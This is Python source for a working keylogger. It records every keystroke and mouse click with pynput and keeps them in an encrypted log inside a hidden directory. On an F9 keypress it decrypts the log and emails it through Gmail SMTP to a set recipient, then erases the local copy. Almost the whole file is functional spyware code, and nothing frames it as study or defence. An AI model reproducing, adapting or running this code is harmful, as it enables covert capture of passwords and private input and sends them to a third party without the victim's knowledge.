# My resources
from constants import *
from utils import *

# Site-packages
from playsound import playsound
from pynput.keyboard import Listener as Keyboard_listener, Key
from pynput.mouse import Listener as Mouse_listener, Button

# stdlibs
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from os.path import join
from pickle import load, dump
from smtplib import SMTP
from ssl import create_default_context


def write_to_log(s: str) -> None:
    """
    Write encrypted data to the log file.
    """
    dump(fernet.encrypt(s.encode("utf-8")), log_f)


def keyboard_press(key: Key) -> None:
    """
    on_press for keyboard listener.
    """
    # Flag variable, when press F9, exit_ = True,
    # terminate Keyboard listener and also terminate Mouse listener
    global exit_

    # Check if it's an alphanumeric key
    try:
        # Check if it's a combination key - goes with Ctrl
        try:
            key = CHARS[CODES.index(str(key).replace("'", ""))]
            key = f"「{key}」"

        # This can cause ValueError (if it's not a combination key)
        except ValueError:
            key = key.char

    # This can cause AttributeError (if it's a special key)
    except AttributeError:

        # Press F9 -> send mail AND terminate keylogger
        if key == Key.f9:
            write_to_log(f"\n\n「Keylogger terminated {get_time(day=True)}」")
            exit_ = True
            send_mail()
            return False

        # Enter -> create new line in log file + get time
        elif key == Key.enter:
            key = f"\n「••   {get_time(day=True)}」 "

        # For aesthetic
        elif key == Key.backspace:
            key = "「«×」"
        elif key == Key.delete:
            key = "「×»」"
        elif key == Key.space:
            key = "「_」"

        else:
            # For aesthetic
            key = str(key).replace("Key.", "")\
                  .replace("_l", "").replace("_r", "").replace("_gr", "")
            if key == "shift":
                key = "↑"
            key = f"「{key}」"

    write_to_log(key)


def mouse_click(x, y, button, pressed) -> None:
    """
    on_click for mouse listener.
    """
    if exit_:
        return False
    if pressed:
        if button == Button.left:
            button = "L"
        else:
            button = "R" if (button == Button.right) else "M"

        # Max dim: eg.1920, 1080 -> Each of them has 4 digits
        # :>4d: Right aligned text with width=4
        write_to_log(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")


def send_mail() -> None:
    """
    Send keylogger data through Gmail.
    """
    try:
        # Change the position to the start of file
        log_f.seek(0)

        # Read beyond end of the log file
        try:
            body = ""
            while True:
                # Decrypt the log file
                body += fernet.decrypt(load(log_f)).decode()

        # After reached EOF, embed it into a HTML template
        except EOFError:
            # New line character in HTML is the `<br>` tag,
            # space character in HTML is `&nbsp;`
            body = body.replace("\n", "<br>").replace(" ", "&nbsp;")

            # Change font size and font face
            body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'

        # Initialize and login gmail server
        server = SMTP(host="smtp.gmail.com", port=587)
        server.ehlo()
        server.starttls(context=create_default_context())
        server.ehlo()
        server.login(user=SENDER, password=SMTP_PASSWORD)

        # Initialize message
        message = MIMEMultipart()
        message["Subject"] = f"Keylogger {get_time(day=True)}"
        message["From"] = SENDER
        message["To"] = RECIPIENT
        message.attach(MIMEText(body, "html", "utf-8"))

        # Send message and log out
        server.send_message(message)
        server.quit()

        # After sending the mail successfully,
        # delete all data in the log file and close it
        log_f.truncate(0)
        log_f.close()

    # Play a sound if exists any error
    except:
        playsound(FAIL_SOUND)


if __name__ == "__main__":
    # When goes with Ctrl, CHARS[i] is written as CODES[i] (0 <= i <= 35),
    # since the English alphabet has 26 letters from A to Z
    # and 10 digits from 0 to 9, so total is 36 chars
    CHARS = ("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K",
             "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
             "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6",
             "7", "8", "9"
    )
    CODES = (r"\x01", r"\x02", r"\x03", r"\x04", r"\x05", r"\x06",
             r"\x07", r"\x08", r"\t", r"\n", r"\x0b", r"\x0c",
             r"\r", r"\x0e", r"\x0f", r"\x10", r"\x11", r"\x12",
             r"\x13", r"\x14", r"\x15", r"\x16", r"\x17", r"\x18",
             r"\x19", r"\x1a", "<48>", "<49>", "<50>", "<51>",
             "<52>", "<53>", "<54>", "<55>", "<56>", "<57>"
    )

    # Initialization
    with open("key.pkl", "rb") as key_file:
        fernet = load(key_file)
    exit_ = False
    log_f = open(join(HIDE_DIR, LOG_FILE), "ab+")
    write_to_log(f"\n\n「Keylogger started {get_time(day=True)}」\n")

    # Create threads
    keyboard = Keyboard_listener(on_press=keyboard_press)
    mouse = Mouse_listener(on_click=mouse_click)

    # Start both threads
    keyboard.start()
    mouse.start()

    # Wait until both threads are completely executed
    keyboard.join()
    mouse.join()
